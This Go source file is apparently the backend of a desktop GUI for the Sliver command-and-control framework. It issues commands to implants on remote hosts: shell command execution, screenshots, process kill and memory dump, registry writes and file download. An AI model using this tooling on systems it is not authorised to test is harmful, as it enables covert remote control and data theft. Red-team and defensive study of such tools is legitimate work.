package main

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	goruntime "runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/wailsapp/wails/v2/pkg/runtime"
	"google.golang.org/protobuf/proto"

	"sliver-gui/internal/sliverclient"
)

type App struct {
	ctx         context.Context
	mu          sync.Mutex
	client      *sliverclient.Client
	eventCancel context.CancelFunc

	// Advanced tunneling state (SOCKS5 + port forwarding).
	// Guarded by advMu, NOT mu, so we never deadlock with requireClient().
	advMu    sync.Mutex
	socks    map[string]*socksProxyHandle // sessionID -> active socks proxy
	portfwds map[string][]*portfwdHandle  // sessionID -> active port forwards
	shells   map[string]*shellHandle      // tunnelID -> interactive shell

	audit *auditLogger // operator action log (~/.sliver-gui/audit.log)

	// localAPIH backs the loopback JSON server started by StartLocalAPI. Guarded
	// by its own mutex (inside the struct); a nil pointer is normal on start.
	localAPIH *localAPI
}

func NewApp() *App {
	return &App{
		socks:    map[string]*socksProxyHandle{},
		portfwds: map[string][]*portfwdHandle{},
		shells:   map[string]*shellHandle{},
		audit:    newAuditLogger(),
	}
}

func (a *App) startup(ctx context.Context)  { a.ctx = ctx }
func (a *App) shutdown(ctx context.Context) {
	a.mu.Lock()
	defer a.mu.Unlock()
	if a.eventCancel != nil {
		a.eventCancel()
	}
	if a.client != nil {
		a.client.Close()
	}
}

// ─── Connection ───────────────────────────────────────────────────────────────

// safeOpenFileDialog wraps runtime.OpenFileDialog with a nil-ctx check and panic
// recovery to prevent app crashes if native OS file dialogs fail on Windows/Linux.
func (a *App) safeOpenFileDialog(opts runtime.OpenDialogOptions) (res string, err error) {
	if a.ctx == nil {
		return "", fmt.Errorf("application context not initialized")
	}
	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("file dialog error: %v", r)
		}
	}()
	return runtime.OpenFileDialog(a.ctx, opts)
}

// safeSaveFileDialog wraps runtime.SaveFileDialog with a nil-ctx check and panic
// recovery to prevent app crashes if native OS file dialogs fail on Windows/Linux.
func (a *App) safeSaveFileDialog(opts runtime.SaveDialogOptions) (res string, err error) {
	if a.ctx == nil {
		return "", fmt.Errorf("application context not initialized")
	}
	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("file dialog error: %v", r)
		}
	}()
	return runtime.SaveFileDialog(a.ctx, opts)
}

func (a *App) PickConfigFile() (string, error) {
	return a.safeOpenFileDialog(runtime.OpenDialogOptions{
		Title:   "Select Sliver operator config (.cfg)",
		Filters: []runtime.FileFilter{{DisplayName: "Sliver Config (*.cfg)", Pattern: "*.cfg"}},
	})
}

// PickDirectory is intentionally NOT exposed anymore. runtime.OpenDirectoryDialog
// hits the same Windows COM common-dialog crash as OpenFileDialog on some
// operator configs - the whole WebView2 process dies. The frontend uses the
// in-app directory browser (ListDirectory / ListDriveRoots / HomeDirectory)
// instead. Left as a stub returning an error so any stale JS call surfaces
// gracefully instead of silently failing.
func (a *App) PickDirectory(title string) (string, error) {
	return "", fmt.Errorf("native folder picker disabled - this build uses the in-app directory browser (safer against Common Dialog COM crashes on Windows)")
}

// DirEntry is one row in an in-app directory listing.
type DirEntry struct {
	Name     string `json:"name"`
	IsDir    bool   `json:"isDir"`
	Size     int64  `json:"size"`
	FullPath string `json:"fullPath"` // absolute - filepath.Join'd server-side so the frontend never has to join paths
}

// DirListing is what the in-app directory browser needs to render a level:
// the absolute path being shown, the parent path (empty at a root), and the
// sub-entries. Directories are listed first, names sorted case-insensitively.
type DirListing struct {
	Path       string     `json:"path"`
	Parent     string     `json:"parent"`
	IsRoot     bool       `json:"isRoot"`
	Entries    []DirEntry `json:"entries"`
	Error      string     `json:"error,omitempty"`
}

// ListDirectory returns the immediate contents of a directory for the in-app
// folder browser. If `path` is empty, defaults to the operator's home dir.
// Filters to directories only when `dirsOnly` is true (the "choose a folder"
// UX). Errors like permission-denied are returned in `Error` rather than as
// a Go error so the UI can render "❌ Access denied" inline instead of
// blowing up the calling dialog.
func (a *App) ListDirectory(path string, dirsOnly bool) DirListing {
	out := DirListing{}
	if strings.TrimSpace(path) == "" {
		home, err := os.UserHomeDir()
		if err != nil || home == "" {
			home = "."
		}
		path = home
	}
	abs, err := filepath.Abs(path)
	if err != nil {
		out.Error = "resolve: " + err.Error()
		out.Path = path
		return out
	}
	out.Path = abs
	parent := filepath.Dir(abs)
	if parent == abs { // filesystem root (e.g. `/` or `C:\`)
		out.IsRoot = true
	} else {
		out.Parent = parent
	}
	entries, err := os.ReadDir(abs)
	if err != nil {
		out.Error = err.Error()
		return out
	}
	rows := make([]DirEntry, 0, len(entries))
	for _, e := range entries {
		if dirsOnly && !e.IsDir() {
			continue
		}
		name := e.Name()
		// Hide dotfiles and Windows hidden system dirs to keep the picker
		// legible; the operator can still paste the path directly.
		if strings.HasPrefix(name, ".") || strings.EqualFold(name, "$RECYCLE.BIN") || strings.EqualFold(name, "System Volume Information") {
			continue
		}
		var size int64
		if info, err := e.Info(); err == nil {
			size = info.Size()
		}
		rows = append(rows, DirEntry{
			Name:     name,
			IsDir:    e.IsDir(),
			Size:     size,
			FullPath: filepath.Join(abs, name),
		})
	}
	// Directories first, then case-insensitive name order.
	sort.Slice(rows, func(i, j int) bool {
		if rows[i].IsDir != rows[j].IsDir {
			return rows[i].IsDir
		}
		return strings.ToLower(rows[i].Name) < strings.ToLower(rows[j].Name)
	})
	out.Entries = rows
	return out
}

// ListDriveRoots enumerates the filesystem roots the in-app browser jumps
// between. On Windows that's every mounted drive letter that exists; on
// Unix it's just "/". Used to render the "up one level from C:\" case
// where there is no traditional parent directory.
func (a *App) ListDriveRoots() []string {
	roots := []string{}
	if runtimeIsWindows() {
		for c := 'A'; c <= 'Z'; c++ {
			p := string(c) + `:\`
			if _, err := os.Stat(p); err == nil {
				roots = append(roots, p)
			}
		}
		return roots
	}
	return []string{"/"}
}

// HomeDirectory returns the operator's home dir - the default starting
// point for the in-app folder browser. Empty string on error (rare).
func (a *App) HomeDirectory() string {
	h, _ := os.UserHomeDir()
	return h
}

// EnsureDirectory creates the directory (and any missing parents) if it
// doesn't exist, and returns the absolute path. Used by "Save" in the
// folder browser so the operator can pick a not-yet-created path.
func (a *App) EnsureDirectory(path string) (string, error) {
	if strings.TrimSpace(path) == "" {
		return "", fmt.Errorf("path required")
	}
	abs, err := filepath.Abs(path)
	if err != nil {
		return "", err
	}
	if err := os.MkdirAll(abs, 0o755); err != nil {
		return "", err
	}
	return abs, nil
}

// runtimeIsWindows is a tiny wrapper around Go's runtime.GOOS that keeps the
// OS check in one spot. Uses the goruntime alias so it doesn't clash with
// the wails runtime package that's already imported as `runtime`.
func runtimeIsWindows() bool { return goruntime.GOOS == "windows" }

// SaveConfigBytesToTemp writes an operator config uploaded from the WebView's
// HTML <input type="file"> (as base64) to a temp file and returns the path.
// The caller then passes that path to Connect() as if it had come from the
// native picker. Bypasses runtime.OpenFileDialog entirely - which is known to
// crash the WebView2 process on some Windows configs (a Go recover() cannot
// catch a GPF in the common-dialog COM plumbing, so the app just dies).
//
// The temp file is placed under $TMP/sliver-gui-configs/ with a random name
// and 0600 perms so the operator cert/key can't be world-read while it sits
// on disk. cleanupTempConfigs() (called on disconnect and app shutdown)
// removes them.
func (a *App) SaveConfigBytesToTemp(filename, base64Data string) (string, error) {
	if strings.TrimSpace(base64Data) == "" {
		return "", fmt.Errorf("empty config data")
	}
	data, err := base64.StdEncoding.DecodeString(base64Data)
	if err != nil {
		return "", fmt.Errorf("decode config bytes: %w", err)
	}
	// Sanity-check it's a plausible Sliver operator config before we write it
	// to disk. Cheaper than the operator hitting a cryptic error at Connect().
	if !bytes.Contains(data, []byte(`"ca_certificate"`)) && !bytes.Contains(data, []byte(`"certificate"`)) {
		return "", fmt.Errorf("this doesn't look like a Sliver operator .cfg (missing certificate fields)")
	}
	dir := filepath.Join(os.TempDir(), "sliver-gui-configs")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return "", fmt.Errorf("mkdir temp dir: %w", err)
	}
	nameOnly := filepath.Base(filename)
	if nameOnly == "" || nameOnly == "." || nameOnly == "/" {
		nameOnly = "operator.cfg"
	}
	// Random prefix so two operators using the same cfg filename can coexist
	// and so a stale file can't be re-picked accidentally.
	tag := randSuffix()
	path := filepath.Join(dir, tag+"-"+nameOnly)
	if err := os.WriteFile(path, data, 0o600); err != nil {
		return "", fmt.Errorf("write temp config: %w", err)
	}
	return path, nil
}

// CleanupTempConfigs removes every file this session wrote via
// SaveConfigBytesToTemp. Called on disconnect and app shutdown. Best-effort:
// a failure to remove one file is not surfaced - an orphaned temp cfg is
// harmless and the next reboot's temp cleanup handles it.
func (a *App) CleanupTempConfigs() {
	dir := filepath.Join(os.TempDir(), "sliver-gui-configs")
	_ = os.RemoveAll(dir)
}

type ConnectResult struct {
	Connected    bool   `json:"connected"`
	OperatorName string `json:"operatorName"`
	Teamserver   string `json:"teamserver"`
	Error        string `json:"error,omitempty"`
}

func (a *App) Connect(configPath string) ConnectResult {
	cfg, err := sliverclient.LoadConfig(configPath)
	if err != nil {
		return ConnectResult{Error: err.Error()}
	}
	client, err := sliverclient.Connect(*cfg)
	if err != nil {
		return ConnectResult{Error: err.Error()}
	}
	a.mu.Lock()
	if a.client != nil {
		a.client.Close()
	}
	if a.eventCancel != nil {
		a.eventCancel()
	}
	a.client = client
	a.mu.Unlock()

	a.startEventStream()

	server := fmt.Sprintf("%s:%d", cfg.LHost, cfg.LPort)
	a.audit.setIdentity(cfg.Operator, server)
	a.audit.log("connect", server, "operator "+cfg.Operator)

	return ConnectResult{
		Connected:    true,
		OperatorName: cfg.Operator,
		Teamserver:   server,
	}
}

func (a *App) Disconnect() {
	a.mu.Lock()
	defer a.mu.Unlock()
	if a.eventCancel != nil {
		a.eventCancel()
		a.eventCancel = nil
	}
	if a.client != nil {
		a.client.Close()
		a.client = nil
	}
}

func (a *App) requireClient() (*sliverclient.Client, error) {
	a.mu.Lock()
	defer a.mu.Unlock()
	if a.client == nil {
		return nil, fmt.Errorf("not connected to a teamserver")
	}
	return a.client, nil
}

// ─── Event Stream ─────────────────────────────────────────────────────────────

func (a *App) startEventStream() {
	a.mu.Lock()
	streamCtx, cancel := context.WithCancel(a.ctx)
	a.eventCancel = cancel
	client := a.client
	a.mu.Unlock()

	go func() {
		stream, err := client.RPC.Events(streamCtx, &commonpb.Empty{})
		if err != nil {
			runtime.EventsEmit(a.ctx, "sliver:disconnected", err.Error())
			return
		}
		for {
			event, err := stream.Recv()
			if err != nil {
				// The teamserver stream died - signal the frontend so it can
				// show the reconnect overlay. Suppress if this was a clean
				//, operator-initiated Disconnect() (context cancelled).
				if streamCtx.Err() == nil {
					runtime.EventsEmit(a.ctx, "sliver:disconnected", err.Error())
				}
				return
			}
			payload := map[string]interface{}{
				"type": event.EventType,
				"data": string(event.Data),
			}
			if event.Session != nil {
				payload["session"] = map[string]interface{}{
					"id":       event.Session.ID,
					"hostname": event.Session.Hostname,
					"username": event.Session.Username,
					"os":       event.Session.OS,
					"arch":     event.Session.Arch,
				}
			}
			if event.Job != nil {
				payload["job"] = map[string]interface{}{
					"id":   event.Job.ID,
					"name": event.Job.Name,
				}
			}
			runtime.EventsEmit(a.ctx, "sliver:event", payload)

			if event.EventType == "beacon-taskresult" && len(event.Data) > 0 {
				var task clientpb.BeaconTask
				if proto.Unmarshal(event.Data, &task) == nil && task.ID != "" {
					// Emit a signal-only event so the frontend can short-circuit
					// its poll loop and immediately fetch the response through
					// the correct decoder (native or shell). Do NOT decode the
					// response here - this handler cannot know the original
					// command type, and parseExecuteResponse only understands
					// the Execute protobuf shape.
					runtime.EventsEmit(a.ctx, "sliver:beacon-task-done", map[string]interface{}{
						"taskId":   task.ID,
						"beaconId": task.BeaconID,
						"state":    task.State,
					})
				}
			}
		}
	}()
}

// ─── Version ─────────────────────────────────────────────────────────────────

type VersionInfo struct {
	Major    int32  `json:"major"`
	Minor    int32  `json:"minor"`
	Patch    int32  `json:"patch"`
	Commit   string `json:"commit"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	Compiled string `json:"compiled"`
}

func (a *App) GetVersion() (VersionInfo, error) {
	client, err := a.requireClient()
	if err != nil {
		return VersionInfo{}, err
	}
	resp, err := client.RPC.GetVersion(a.ctx, &commonpb.Empty{})
	if err != nil {
		return VersionInfo{}, err
	}
	return VersionInfo{
		Major:    resp.Major,
		Minor:    resp.Minor,
		Patch:    resp.Patch,
		Commit:   resp.Commit,
		OS:       resp.OS,
		Arch:     resp.Arch,
		Compiled: time.Unix(resp.CompiledAt, 0).UTC().Format("2006-01-02"),
	}, nil
}

// ─── Sessions ────────────────────────────────────────────────────────────────

type SessionView struct {
	ID            string `json:"id"`
	Name          string `json:"name"`
	Hostname      string `json:"hostname"`
	Username      string `json:"username"`
	OS            string `json:"os"`
	Arch          string `json:"arch"`
	Transport     string `json:"transport"`
	RemoteAddr    string `json:"remoteAddress"`
	LastCheckin   string `json:"lastCheckin"`
	LastCheckinTs int64  `json:"lastCheckinTs"` // unix seconds - for freshness coloring on the frontend
	PID           int32  `json:"pid"`
	IsDead        bool   `json:"isDead"`
}

func (a *App) ListSessions() ([]SessionView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	sessions, err := client.ListSessions(a.ctx)
	if err != nil {
		return nil, err
	}
	out := make([]SessionView, 0, len(sessions))
	for _, s := range sessions {
		out = append(out, sessionToView(s))
	}
	return out, nil
}

func sessionToView(s *clientpb.Session) SessionView {
	return SessionView{
		ID:            s.ID,
		Name:          s.Name,
		Hostname:      s.Hostname,
		Username:      s.Username,
		OS:            s.OS,
		Arch:          s.Arch,
		Transport:     s.Transport,
		RemoteAddr:    s.RemoteAddress,
		LastCheckin:   time.Unix(s.LastCheckin, 0).Format("15:04:05"),
		LastCheckinTs: s.LastCheckin,
		PID:           s.PID,
		IsDead:        s.IsDead,
	}
}

func (a *App) RenameSession(sessionID, newName string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	return client.RenameSession(a.ctx, sessionID, newName)
}

func (a *App) RenameBeacon(beaconID, newName string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	return client.RenameBeacon(a.ctx, beaconID, newName)
}

func (a *App) KillSession(sessionID string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Kill(a.ctx, &sliverpb.KillReq{
		Force:   false,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ─── Execute ─────────────────────────────────────────────────────────────────

type ExecResult struct {
	Stdout string `json:"stdout"`
	Stderr string `json:"stderr"`
	Status uint32 `json:"status"`
	Error  string `json:"error,omitempty"`
}

func (a *App) ExecuteCommand(sessionID, command string) ExecResult {
	client, err := a.requireClient()
	if err != nil {
		return ExecResult{Error: err.Error()}
	}
	a.audit.log("command", sessionID, command)
	sessions, _ := client.ListSessions(a.ctx)
	var sessionOS string
	for _, s := range sessions {
		if s.ID == sessionID {
			sessionOS = strings.ToLower(s.OS)
			break
		}
	}
	var exePath string
	var args []string
	if strings.Contains(sessionOS, "windows") {
		exePath = "cmd.exe"
		args = []string{"/c", command}
	} else {
		exePath = "/bin/sh"
		args = []string{"-c", command}
	}
	resp, err := client.RPC.Execute(a.ctx, &sliverpb.ExecuteReq{
		Path:    exePath,
		Args:    args,
		Output:  true,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return ExecResult{Error: err.Error()}
	}
	return ExecResult{
		Stdout: string(resp.Stdout),
		Stderr: string(resp.Stderr),
		Status: resp.Status,
	}
}

// RunExecute runs a program on the target directly (Sliver's `execute`), without
// wrapping it in a shell. Use this for `execute <path> [args...]`.
func (a *App) RunExecute(sessionID, path string, args []string) ExecResult {
	client, err := a.requireClient()
	if err != nil {
		return ExecResult{Error: err.Error()}
	}
	resp, err := client.RPC.Execute(a.ctx, &sliverpb.ExecuteReq{
		Path:    path,
		Args:    args,
		Output:  true,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return ExecResult{Error: err.Error()}
	}
	return ExecResult{Stdout: string(resp.Stdout), Stderr: string(resp.Stderr), Status: resp.Status}
}

// ─── Screenshot ──────────────────────────────────────────────────────────────

func (a *App) TakeScreenshot(sessionID string) (string, error) {
	client, err := a.requireClient()
	if err != nil {
		return "", err
	}
	resp, err := client.RPC.Screenshot(a.ctx, &sliverpb.ScreenshotReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return "", err
	}
	return "data:image/png;base64," + base64.StdEncoding.EncodeToString(resp.Data), nil
}

// ─── Process List ────────────────────────────────────────────────────────────

type ProcessView struct {
	PID        int32  `json:"pid"`
	PPID       int32  `json:"ppid"`
	Executable string `json:"executable"`
	Owner      string `json:"owner"`
	Arch       string `json:"arch"`
	CmdLine    string `json:"cmdLine"`
}

func (a *App) GetProcessList(sessionID string) ([]ProcessView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.Ps(a.ctx, &sliverpb.PsReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	out := make([]ProcessView, 0, len(resp.Processes))
	for _, p := range resp.Processes {
		out = append(out, ProcessView{
			PID:        p.Pid,
			PPID:       p.Ppid,
			Executable: p.Executable,
			Owner:      p.Owner,
			Arch:       p.Architecture,
			CmdLine:    strings.Join(p.CmdLine, " "),
		})
	}
	return out, nil
}

func (a *App) KillRemoteProcess(sessionID string, pid uint32) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Terminate(a.ctx, &sliverpb.TerminateReq{
		Pid:     int32(pid),
		Force:   false,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ─── Netstat ─────────────────────────────────────────────────────────────────

type NetstatEntry struct {
	LocalAddr  string `json:"localAddr"`
	RemoteAddr string `json:"remoteAddr"`
	Protocol   string `json:"protocol"`
	State      string `json:"state"`
	PID        uint32 `json:"pid"`
	Process    string `json:"process"`
}

func (a *App) GetNetstat(sessionID string) ([]NetstatEntry, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.Netstat(a.ctx, &sliverpb.NetstatReq{
		TCP:       true,
		UDP:       true,
		IP4:       true,
		IP6:       true,
		Listening: true,
		Request:   &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	out := make([]NetstatEntry, 0, len(resp.Entries))
	for _, e := range resp.Entries {
		local, remote := "", ""
		if e.LocalAddr != nil {
			local = fmt.Sprintf("%s:%d", e.LocalAddr.Ip, e.LocalAddr.Port)
		}
		if e.RemoteAddr != nil {
			remote = fmt.Sprintf("%s:%d", e.RemoteAddr.Ip, e.RemoteAddr.Port)
		}
		var pid uint32
		var proc string
		if e.Process != nil {
			pid = uint32(e.Process.Pid)
			proc = e.Process.Executable
		}
		out = append(out, NetstatEntry{
			LocalAddr:  local,
			RemoteAddr: remote,
			Protocol:   e.Protocol,
			State:      e.SkState,
			PID:        pid,
			Process:    proc,
		})
	}
	return out, nil
}

// ─── Env Vars ────────────────────────────────────────────────────────────────

type EnvVar struct {
	Key   string `json:"key"`
	Value string `json:"value"`
}

func (a *App) GetEnvVars(sessionID string) ([]EnvVar, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.GetEnv(a.ctx, &sliverpb.EnvReq{
		Name:    "",
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	out := make([]EnvVar, 0, len(resp.Variables))
	for _, v := range resp.Variables {
		out = append(out, EnvVar{Key: v.Key, Value: v.Value})
	}
	return out, nil
}

func (a *App) SetEnvVar(sessionID, key, value string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.SetEnv(a.ctx, &sliverpb.SetEnvReq{
		Variable: &commonpb.EnvVar{Key: key, Value: value},
		Request:  &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) UnsetEnvVar(sessionID, key string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.UnsetEnv(a.ctx, &sliverpb.UnsetEnvReq{
		Name:    key,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ─── Registry (Windows) ──────────────────────────────────────────────────────

type RegistryKey struct {
	Name string `json:"name"`
}

type RegistryValue struct {
	Name  string `json:"name"`
	Type  string `json:"type"`
	Value string `json:"value"`
}

func (a *App) RegistryListSubKeys(sessionID, hive, path string) ([]string, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.RegistryListSubKeys(a.ctx, &sliverpb.RegistrySubKeyListReq{
		Hive:    hive,
		Path:    path,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	return resp.Subkeys, nil
}

// hiveToRegQuery maps the short hive names used in the UI to the full names
// that reg.exe expects.
var hiveToRegQuery = map[string]string{
	"HKLM": "HKEY_LOCAL_MACHINE",
	"HKCU": "HKEY_CURRENT_USER",
	"HKCR": "HKEY_CLASSES_ROOT",
	"HKU":  "HKEY_USERS",
	"HKCC": "HKEY_CURRENT_CONFIG",
}

// RegistryListValues: the RegistryListValues RPC only returns value *names*
// (RegistryValuesList.ValueNames) in v1.7.3 - no types or data. To show
// name/type/value we fall back to `reg query` via Execute and parse its output.
func (a *App) RegistryListValues(sessionID, hive, path string) ([]RegistryValue, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	fullHive := hiveToRegQuery[strings.ToUpper(hive)]
	if fullHive == "" {
		fullHive = hive
	}
	keyPath := fullHive
	if path != "" {
		keyPath = fullHive + "\\" + strings.Trim(path, "\\")
	}
	resp, err := client.RPC.Execute(a.ctx, &sliverpb.ExecuteReq{
		Path:    "reg.exe",
		Args:    []string{"query", keyPath},
		Output:  true,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	out := []RegistryValue{}
	lines := strings.Split(strings.ReplaceAll(string(resp.Stdout), "\r\n", "\n"), "\n")
	for _, line := range lines {
		// Value rows are indented; reg.exe separates columns with 4 spaces.
		if !strings.HasPrefix(line, "    ") {
			continue
		}
		cols := strings.SplitN(strings.TrimLeft(line, " "), "    ", 3)
		if len(cols) < 3 {
			continue
		}
		out = append(out, RegistryValue{
			Name:  strings.TrimSpace(cols[0]),
			Type:  strings.TrimSpace(cols[1]),
			Value: strings.TrimSpace(cols[2]),
		})
	}
	return out, nil
}

func (a *App) RegistryReadValue(sessionID, hive, path, key string) (string, error) {
	client, err := a.requireClient()
	if err != nil {
		return "", err
	}
	resp, err := client.RPC.RegistryRead(a.ctx, &sliverpb.RegistryReadReq{
		Hive:    hive,
		Path:    path,
		Key:     key,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return "", err
	}
	return resp.Value, nil
}

func (a *App) RegistryWriteValue(sessionID, hive, path, key, value string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.RegistryWrite(a.ctx, &sliverpb.RegistryWriteReq{
		Hive:        hive,
		Path:        path,
		Key:         key,
		StringValue: value,
		Type:        1, // RegistryWriteReq.Type is uint32; 1 == REG_SZ
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) RegistryCreateKey(sessionID, hive, path, key string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.RegistryCreateKey(a.ctx, &sliverpb.RegistryCreateKeyReq{
		Hive:    hive,
		Path:    path,
		Key:     key,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) RegistryDeleteKey(sessionID, hive, path, key string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.RegistryDeleteKey(a.ctx, &sliverpb.RegistryDeleteKeyReq{
		Hive:    hive,
		Path:    path,
		Key:     key,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ─── File Browser ────────────────────────────────────────────────────────────

type LsResult struct {
	Path  string     `json:"path"`
	Files []FileInfo `json:"files"`
	Error string     `json:"error,omitempty"`
}

type FileInfo struct {
	Name  string `json:"name"`
	IsDir bool   `json:"isDir"`
	Size  int64  `json:"size"`
	Mode  string `json:"mode"`
}

func (a *App) ListFiles(sessionID, path string) LsResult {
	client, err := a.requireClient()
	if err != nil {
		return LsResult{Error: err.Error()}
	}
	if path == "" {
		path = "."
	}
	resp, err := client.RPC.Ls(a.ctx, &sliverpb.LsReq{
		Path:    path,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return LsResult{Error: err.Error()}
	}
	files := make([]FileInfo, 0, len(resp.Files))
	for _, f := range resp.Files {
		files = append(files, FileInfo{Name: f.Name, IsDir: f.IsDir, Size: f.Size, Mode: f.Mode})
	}
	return LsResult{Path: resp.Path, Files: files}
}

func (a *App) MakeDirectory(sessionID, path string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Mkdir(a.ctx, &sliverpb.MkdirReq{
		Path:    path,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ChangeDir changes the implant's working directory (real Cd RPC) and returns
// the new absolute path.
func (a *App) ChangeDir(sessionID, path string) (string, error) {
	client, err := a.requireClient()
	if err != nil {
		return "", err
	}
	resp, err := client.RPC.Cd(a.ctx, &sliverpb.CdReq{
		Path:    path,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return "", err
	}
	return resp.Path, nil
}

// PrintWorkingDir returns the implant's current working directory (real Pwd RPC).
func (a *App) PrintWorkingDir(sessionID string) (string, error) {
	client, err := a.requireClient()
	if err != nil {
		return "", err
	}
	resp, err := client.RPC.Pwd(a.ctx, &sliverpb.PwdReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return "", err
	}
	return resp.Path, nil
}

func (a *App) MoveFile(sessionID, src, dst string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Mv(a.ctx, &sliverpb.MvReq{
		Src:     src,
		Dst:     dst,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) CopyFile(sessionID, src, dst string) (int64, error) {
	client, err := a.requireClient()
	if err != nil {
		return 0, err
	}
	resp, err := client.RPC.Cp(a.ctx, &sliverpb.CpReq{
		Src:     src,
		Dst:     dst,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return 0, err
	}
	return resp.BytesWritten, nil
}

// ReadRemoteFile downloads a file and returns its contents as text (for `cat`).
func (a *App) ReadRemoteFile(sessionID, path string) (string, error) {
	client, err := a.requireClient()
	if err != nil {
		return "", err
	}
	resp, err := client.RPC.Download(a.ctx, &sliverpb.DownloadReq{
		Path:             path,
		RestrictedToFile: true,
		Request:          &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return "", err
	}
	if resp.IsDir {
		return "", fmt.Errorf("%s is a directory", path)
	}
	data, err := decodeDownload(resp)
	if err != nil {
		return "", err
	}
	return string(data), nil
}

// ─── Network / Privileges / Memory ─────────────────────────────────────────────

type NetInterfaceView struct {
	Name string   `json:"name"`
	MAC  string   `json:"mac"`
	IPs  []string `json:"ips"`
}

func (a *App) Ifconfig(sessionID string) ([]NetInterfaceView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.Ifconfig(a.ctx, &sliverpb.IfconfigReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	out := make([]NetInterfaceView, 0, len(resp.NetInterfaces))
	for _, ni := range resp.NetInterfaces {
		out = append(out, NetInterfaceView{Name: ni.Name, MAC: ni.MAC, IPs: ni.IPAddresses})
	}
	return out, nil
}

type PrivEntry struct {
	Name        string `json:"name"`
	Description string `json:"description"`
	Enabled     bool   `json:"enabled"`
}

type PrivsResult struct {
	Integrity   string      `json:"integrity"`
	ProcessName string      `json:"processName"`
	Privs       []PrivEntry `json:"privs"`
}

func (a *App) GetPrivs(sessionID string) (PrivsResult, error) {
	client, err := a.requireClient()
	if err != nil {
		return PrivsResult{}, err
	}
	resp, err := client.RPC.GetPrivs(a.ctx, &sliverpb.GetPrivsReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return PrivsResult{}, err
	}
	out := PrivsResult{Integrity: resp.ProcessIntegrity, ProcessName: resp.ProcessName}
	for _, p := range resp.PrivInfo {
		out.Privs = append(out.Privs, PrivEntry{Name: p.Name, Description: p.Description, Enabled: p.Enabled})
	}
	return out, nil
}

// ProcessDump dumps a process's memory and saves it via a native dialog.
func (a *App) ProcessDump(sessionID string, pid int32) TransferResult {
	client, err := a.requireClient()
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	resp, err := client.RPC.ProcessDump(a.ctx, &sliverpb.ProcessDumpReq{
		Pid:     pid,
		Timeout: 30,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return TransferResult{Error: err.Error()}
	}
	savePath, err := a.safeSaveFileDialog(runtime.SaveDialogOptions{
		DefaultFilename: fmt.Sprintf("procdump_%d.dmp", pid),
		Title:           "Save process dump",
	})
	if err != nil || savePath == "" {
		return TransferResult{Error: "save cancelled"}
	}
	if err := os.WriteFile(savePath, resp.Data, 0644); err != nil {
		return TransferResult{Error: err.Error()}
	}
	return TransferResult{Path: savePath, Bytes: int64(len(resp.Data))}
}

